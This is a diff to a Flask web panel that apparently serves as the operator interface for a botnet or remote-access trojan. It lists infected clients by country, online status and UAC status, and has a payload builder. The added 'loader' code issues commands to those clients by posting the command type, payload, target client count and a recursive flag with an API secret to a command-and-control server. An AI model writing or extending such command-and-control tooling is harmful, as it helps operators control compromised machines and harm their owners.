@@ -50,7 +50,6 @@ def clients():
             continue
         
         client_data["first_seen"] = client_data.get("last_seen", time.time())
-        
         client_data["last_seen"] = convert_to_ago(client_data["last_seen"])
         
         if client_data["country"] == "-":
@@ -61,7 +60,11 @@ def clients():
     
     new_client_data.sort(key=lambda x: x["first_seen"])
     new_client_data = new_client_data[::-1]
-    
+
+    statistics["total_clients"] = f"{statistics['total_clients']:,}"
+    statistics["online_clients"] = f"{statistics['online_clients']:,}"
+    statistics["uac_clients"] = f"{statistics['uac_clients']:,}"
+
     if statistics["last_new_client"] == 0:
         statistics["last_new_client"] = "N/A"
     else:
@@ -70,12 +73,46 @@ def clients():
     print(f"Time for client_list: {time.time() - c_time}\nTime for stats request: {time.time() - s_time}\nTime for processing: {time.time() - p_time}\n")
 
     return render_template("clients.html", client_list=new_client_data, statistics=statistics)
+
 @app.route("/builder")
 def builder():
     return render_template("builder.html")
 
 @app.route("/loader", methods=['GET', 'POST', 'DELETE'])
 def loader():
+
+
+    if request.method == "POST":
+        execution_type = request.form.get('execution_type').split("|")[1][1:]
+        payload = 'placeholder'
+
+        if request.form.get('amount') == '':
+            amount = "999999999"
+        else:
+            amount = request.form.get('amount')
+
+        if request.form.get("is_recursive") != None:
+           is_recursive = True
+        else:
+           is_recursive = False
+
+        print({
+            "api_secret": API_SECRET,
+            "cmd_type": execution_type,
+            "cmd_args": payload,
+            "required_amount": int(amount),
+            "recursive": is_recursive
+        })
+
+        load_creation_response = httpx.post(SERVER_ADDRESS + "/api/issue", 
+            json={
+                "api_secret": API_SECRET,
+                "cmd_type": execution_type,
+                "cmd_args": payload,
+                "required_amount": int(amount),
+                "recursive": is_recursive
+            }
+        )
 
     load_id = request.args.get('delete_load')
     if load_id != None:
@@ -95,8 +132,12 @@ def loader():
 
     return render_template("loader.html", load_list=new_load_data)
 
-@app.route("/logs")
+@app.route("/firewall")
 def logs():
-    return render_template("logs.html")
+    return render_template("firewall.html")
+
+@app.route("/server_logs")
+def server_logs():
+    return render_template("server_logs.html")
 
 app.run("127.0.0.1", 6767)
